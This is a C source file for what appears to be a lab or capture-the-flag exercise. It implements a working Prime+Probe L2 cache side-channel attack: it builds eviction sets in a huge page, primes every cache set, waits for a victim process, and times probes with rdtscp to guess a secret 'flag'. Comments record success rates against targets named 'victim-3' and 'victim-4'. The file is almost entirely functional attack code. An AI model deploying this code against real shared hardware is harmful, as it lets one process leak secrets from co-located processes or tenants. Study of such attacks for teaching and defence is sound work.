#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <sys/mman.h>
#include "util.h"

#define NUM_L2_CACHE_SETS 1024
#define WAYS 16
#define LINE_SIZE 64
#define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)

#define MIN_CYCLES 520
#define MAX_CYCLES 900

#define REPEATS 2000

volatile uint8_t *buf;
volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

static inline uint64_t rdtsc() {
    unsigned hi, lo;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    asm volatile("mfence");
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t rdtscp() {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

static inline void wait_cycles(uint64_t cycles) {
    uint64_t start = rdtscp();
    while (rdtscp() - start < cycles);
}

void shuffle(int *arr) {
    for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = arr[i];
        arr[i] = arr[j];
        arr[j] = tmp;
    }
}

int main() {
    /* works around 9/10 of time on victim-4. Randomize access, reverse double probe, no usleep. High synchornization required for this version
    */
   /* works around 2/5 for victim-3 */
   /* REVERSE PROBING*/
    printf("Attacker ready. Prime+Probe starting...\n");
    /*test wait cycles for victim*/
    wait_cycles(2000000);

    buf = mmap(NULL,
               2*1024*1024,
               PROT_READ | PROT_WRITE,
               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
               -1,
               0);

    if(buf == (void*)-1){
        perror("mmap failed");
        exit(1);
    }

    *((char*)buf) = 1;

    for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        for(int w = 0; w < WAYS; w++) {
            eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
        }
    }

    volatile uint8_t tmp = 0;

    srand(rdtscp());

    while(1) {

        uint64_t scores[NUM_L2_CACHE_SETS] = {0};

        for(int r = 0; r < REPEATS; r++) {

            int perm[NUM_L2_CACHE_SETS];

            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
                perm[i] = i;

            shuffle(perm);

            /* PRIME all sets */

            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {

                int set = perm[i];

                for(int w = 0; w < WAYS; w++)
                    tmp ^= *eviction_sets[set][w];
            }

            /* allow victim to run */

            wait_cycles(8000);

            /* PROBE all sets */

            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {

                int set = perm[i];
                uint64_t total_time = 0;

                for(int w = WAYS - 1; w >= 0; w--) {

                    uint64_t start = rdtscp();
                    tmp ^= *eviction_sets[set][w];
                    uint64_t end = rdtscp();

                    total_time += end - start;
                }

                 if(total_time >= MIN_CYCLES && total_time <= MAX_CYCLES)
                    scores[set]++;
                }
            }

            /* pick best set */

            int best_set = 0;
            uint64_t best_score = 0;

            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {

                if(scores[set] > best_score) {
                    best_score = scores[set];
                    best_set = set;
                }
            }
        printf("Guessed flag: %d (hits=%lu)\n", best_set, best_score);

        wait_cycles(2000);
    }

    return 0;
}